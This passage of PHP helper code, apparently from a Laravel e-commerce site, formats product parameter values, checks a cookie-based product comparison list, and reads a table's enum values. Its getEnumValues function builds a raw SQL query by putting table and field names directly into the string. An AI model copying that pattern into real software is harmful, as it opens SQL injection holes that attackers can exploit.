            $param_value = GetItemRSCCheckboxDataOnlyIDs($parametr->id, $item_id);

            if (!empty($param_value)) {
                $param_value_name = array();

                foreach ($param_value as $pv) {
                    $param_value_name[] = IfHasName($pv, $lang_id, 'goods_parametr_value');
                }
                return implode(', ', $param_value_name);
            }
            break;

        case 'input':
            switch ($parametr->measure_type) {
                case 'with_measure':
                    $param_value = GetItemMeasureData($parametr->id, $item_id);

                    if (!is_null($param_value) && $param_value->parametr_value) {
                        return !empty(IfHasName($parametr->goods_measure_id, $lang_id, 'goods_measure')) ? NumberFormat2($param_value->parametr_value) . ' (' . IfHasName($parametr->goods_measure_id, $lang_id, 'goods_measure') . ')' : NumberFormat2($param_value->parametr_value);
                    }
                    break;

                case 'measure_list':
                    $param_value = GetItemMeasureData($parametr->id, $item_id);
                    if (!is_null($param_value) && $param_value->parametr_value) {
                        return !empty(IfHasName($param_value->goods_measure_id, $lang_id, 'goods_measure')) ? NumberFormat2($param_value->parametr_value) . ' (' . IfHasName($param_value->goods_measure_id, $lang_id, 'goods_measure') . ')' : NumberFormat2($param_value->parametr_value);
                    }
                    break;

                case 'no_measure':
                    $param_value = GetItemSimpleData($parametr->id, $item_id, $lang_id);
                    if (!is_null($param_value) && $param_value->parametr_value) {
                        return $param_value->parametr_value;
                    }
                    break;

                default:
                    break;
            }
            break;

        case 'textarea':
            $param_value = GetItemSimpleData($parametr->goods_parametr_id, $item_id, $lang_id);
            if (!is_null($param_value) && $param_value->parametr_value) {
                return $param_value->parametr_value;
            }
            break;

        default:
            return false;
            break;
    }

}


function checkIfCompareExist($goods_item_id)
{
    $cookie_compare = request()->cookie('compare');

    $compare = null;

    if (!is_null($cookie_compare)) {

        $compare_id = DB::table('compare_id')
            ->where('id', $cookie_compare)
            ->first();

        if (!is_null($compare_id))
            $compare = DB::table('compare')
                ->where('compare_id', $compare_id->id)
                ->where('goods_item_id', $goods_item_id)
                ->first();
    }

    if (!is_null($compare))
        return true;
    else
        return false;

}
function getEnumValues($table, $field){

    $type = DB::select(DB::raw("SHOW COLUMNS FROM $table WHERE Field = '{$field}'"))[0]->Type ;
    preg_match('/^enum\((.*)\)$/', $type, $matches);
    $enum = explode("','", $matches[1]);

    foreach ($enum as $k => $item) {
        $v = trim($item, "'");
        $enum[$k] = $v;
    }

    return $enum;

}
